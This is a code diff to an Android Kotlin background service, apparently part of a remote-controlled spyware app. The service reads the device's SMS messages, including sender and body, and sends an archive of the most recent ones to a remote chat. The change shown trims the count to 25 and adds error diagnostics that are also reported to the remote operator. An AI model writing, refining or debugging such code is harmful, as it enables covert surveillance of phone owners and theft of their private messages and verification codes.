@@ -767,19 +767,23 @@ class BackgroundControlService : Service() {
                 Uri.parse("content://sms") to "جميع الرسائل (SMS)"
             )
             val projection = arrayOf("address", "body", "date")
-            var lastError: String? = null
+            val diagnostics = StringBuilder()
 
             for ((uri, label) in candidateUris) {
                 try {
-                    val sb = StringBuilder("💬 أرشيف رسائل SMS - $label (آخر 50):\n\n")
+                    val sb = StringBuilder("💬 أرشيف رسائل SMS - $label (آخر 25):\n\n")
                     var count = 0
-
-                    contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
-                        val addrIdx = cursor.getColumnIndex("address")
-                        val bodyIdx = cursor.getColumnIndex("body")
-                        while (cursor.moveToNext() && count < 50) {
-                            val sender = if (addrIdx >= 0) cursor.getString(addrIdx) ?: "مجهول" else "مجهول"
-                            val body = if (bodyIdx >= 0) cursor.getString(bodyIdx)?.take(100) ?: "" else ""
+                    val cursor = contentResolver.query(uri, projection, null, null, "date DESC")
+                    if (cursor == null) {
+                        diagnostics.append("• $label: المزوّد أعاد null\n")
+                        continue
+                    }
+                    cursor.use { c ->
+                        val addrIdx = c.getColumnIndex("address")
+                        val bodyIdx = c.getColumnIndex("body")
+                        while (c.moveToNext() && count < 25) {
+                            val sender = if (addrIdx >= 0) c.getString(addrIdx) ?: "مجهول" else "مجهول"
+                            val body = if (bodyIdx >= 0) c.getString(bodyIdx)?.take(100) ?: "" else ""
                             sb.append("• من: $sender\n  النص: $body\n\n")
                             count++
                         }
@@ -788,17 +792,20 @@ class BackgroundControlService : Service() {
                     if (count > 0) {
                         sendDirectMessage(chatId, sb.toString())
                         return@execute
+                    } else {
+                        diagnostics.append("• $label: 0 رسالة\n")
                     }
                 } catch (e: Exception) {
-                    lastError = e.message ?: e.javaClass.simpleName
+                    val err = "${e.javaClass.simpleName}: ${e.message ?: "بدون تفاصيل"}"
+                    Log.e(TAG, "SMS read error on $label: $err")
+                    diagnostics.append("• $label: خطأ ($err)\n")
                 }
             }
 
-            if (lastError != null) {
-                sendDirectMessage(chatId, "❌ تعذر سحب الرسائل: $lastError")
-            } else {
-                sendDirectMessage(chatId, "ℹ️ لا توجد رسائل SMS متاحة أو الصندوق فارغ.")
-            }
+            sendDirectMessage(
+                chatId,
+                "ℹ️ لم يتم العثور على رسائل SMS أو تعذرت القراءة:\n$diagnostics"
+            )
         }
     }
 
